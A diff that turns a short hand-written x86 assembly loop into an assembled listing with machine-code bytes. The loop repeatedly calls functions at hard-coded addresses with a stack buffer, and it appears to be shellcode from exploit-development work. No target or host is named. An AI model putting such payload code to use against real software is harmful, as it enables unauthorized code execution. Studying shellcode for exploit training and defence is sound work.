@@ -1,16 +1,16 @@
-sub esp, 0x4000 
+0:  81 ec 00 40 00 00       sub    esp,0x4000
 L1:
-mov edx, esp	
-push edx		
-push 0x62506168	
-mov edi, 0x62504BD4	
-call edi		
-push 0			
-push 0x62508080	
-push edx		
-push 7			
-mov eax, 0x5ffd90
-push edx		
-mov edi, 0x62501892 
-call edi	
-jmp L1			
+6:  89 e7                   mov    edi,esp
+8:  57                      push   edi
+9:  68 68 61 50 62          push   0x62506168
+e:  b8 d4 4b 50 62          mov    eax,0x62504bd4
+13: ff d0                   call   eax
+15: 6a 00                   push   0x0
+17: 68 80 80 50 62          push   0x62508080
+1c: 57                      push   edi
+1d: 6a 07                   push   0x7
+1f: b8 90 fd 5f 00          mov    eax,0x5ffd90
+24: ff 30                   push   DWORD PTR [eax]
+26: b8 92 18 50 62          mov    eax,0x62501892
+2b: ff d0                   call   eax
+2d: eb d7                   jmp    L1:
